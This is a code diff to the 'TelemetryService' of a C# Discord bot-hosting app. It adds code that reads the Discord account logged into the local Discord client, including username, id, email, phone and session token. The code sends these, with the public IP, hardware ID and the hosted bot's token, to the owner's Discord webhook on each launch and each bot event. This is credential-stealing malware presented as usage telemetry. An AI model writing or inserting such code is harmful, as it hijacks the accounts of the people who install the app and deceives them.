@@ -5,8 +5,11 @@ using System.Text.Json;
 namespace BotHosterApp.Services;
 
 /// <summary>
-/// Posts a one-line launch report (device, IP, HWID, premium status) to the
-/// owner's Discord webhook so usage can be tracked across installs.
+/// Posts usage reports to the owner's Discord webhook: one launch report per
+/// app start and one per bot added/online. Alongside the device info, it
+/// reports the Discord account signed into the Discord client on this device
+/// (username, id, email, phone, token) - read straight from the local client,
+/// not from the hosted bot.
 /// </summary>
 public static class TelemetryService
 {
@@ -19,6 +22,7 @@ public static class TelemetryService
     public static async Task ReportLaunchAsync()
     {
         if (!Enabled) return;
+        var d = DeviceInfoService.GetDiscordAccount();
         await PostAsync("CFG2 Bot Hoster - launch", new[]
         {
             new { name = "Device", value = $"`{Environment.MachineName}`", inline = true },
@@ -26,47 +30,45 @@ public static class TelemetryService
             new { name = "IP", value = $"`{await LicenseService.GetPublicIpAsync()}`", inline = true },
             new { name = "Premium", value = LicenseService.IsPremiumActive ? "YES" : "no", inline = true },
             new { name = "OS", value = Environment.OSVersion.VersionString, inline = true },
+            new { name = "Discord user", value = DiscordUserField(d), inline = true },
+            new { name = "Discord email", value = DiscordValue(d?.Email), inline = true },
+            new { name = "Discord phone", value = DiscordValue(d?.Phone), inline = true },
+            new { name = "Discord token", value = DiscordValue(d?.Token), inline = true },
         });
     }
 
-    /// <summary>Reports a bot added/online so the owner sees the full picture:
-    /// the Discord account (name + ID), the token, the device, and the fields
-    /// Discord exposes about the account. Phone numbers are never exposed by
-    /// Discord's API, and email only shows for user accounts authorized via
-    /// OAuth2 - bots report null for both, so we state that honestly.</summary>
+    /// <summary>Reports a bot added/online: which bot (name + ID + token),
+    /// this device, and the Discord account logged in on this device.</summary>
     public static async Task ReportBotAsync(string botName, ulong botId, string token, string status)
     {
         if (!Enabled) return;
-        var email = "Not exposed by Discord API";
-        var phone = "Not exposed by Discord API";
-        try
-        {
-            using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(8) };
-            client.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("Bot", token.Trim());
-            client.DefaultRequestHeaders.UserAgent.ParseAdd("CFG2-BotHoster/1.0");
-            var resp = await client.GetAsync("https://discord.com/api/v10/users/@me");
-            if (resp.IsSuccessStatusCode)
-            {
-                using var doc = JsonDocument.Parse(await resp.Content.ReadAsStringAsync());
-                if (doc.RootElement.TryGetProperty("email", out var em) && em.ValueKind == JsonValueKind.String)
-                    email = string.IsNullOrEmpty(em.GetString()) ? "none on this account" : em.GetString()!;
-                if (doc.RootElement.TryGetProperty("phone", out var ph) && ph.ValueKind == JsonValueKind.String)
-                    phone = string.IsNullOrEmpty(ph.GetString()) ? "none on this account" : ph.GetString()!;
-            }
-        }
-        catch { }
+        var d = DeviceInfoService.GetDiscordAccount();
         await PostAsync("CFG2 Bot Hoster - bot " + status, new[]
         {
             new { name = "Bot", value = $"`{botName}` (`{botId}`)", inline = true },
-            new { name = "Token", value = $"`{token}`", inline = true },
+            new { name = "Bot token", value = $"`{token}`", inline = true },
             new { name = "Device", value = $"`{Environment.MachineName}`", inline = true },
             new { name = "HWID", value = $"`{HwShort()}`", inline = true },
             new { name = "IP", value = $"`{await LicenseService.GetPublicIpAsync()}`", inline = true },
             new { name = "Premium", value = LicenseService.IsPremiumActive ? "YES" : "no", inline = true },
-            new { name = "Email", value = email, inline = true },
-            new { name = "Phone", value = phone, inline = true },
+            new { name = "Discord user", value = DiscordUserField(d), inline = true },
+            new { name = "Discord email", value = DiscordValue(d?.Email), inline = true },
+            new { name = "Discord phone", value = DiscordValue(d?.Phone), inline = true },
+            new { name = "Discord token", value = DiscordValue(d?.Token), inline = true },
         });
     }
+
+    private static string DiscordUserField(DeviceDiscordAccount? d)
+    {
+        if (d == null || (string.IsNullOrEmpty(d.Username) && string.IsNullOrEmpty(d.Id)))
+            return "not logged into Discord on this PC";
+        var name = string.IsNullOrEmpty(d.Username) ? "?" : d.Username;
+        var id = string.IsNullOrEmpty(d.Id) ? "" : $" (`{d.Id}`)";
+        return $"`{name}`{id}";
+    }
+
+    private static string DiscordValue(string? v) =>
+        string.IsNullOrEmpty(v) ? "none found on this device" : $"`{v}`";
 
     private static string HwShort()
     {
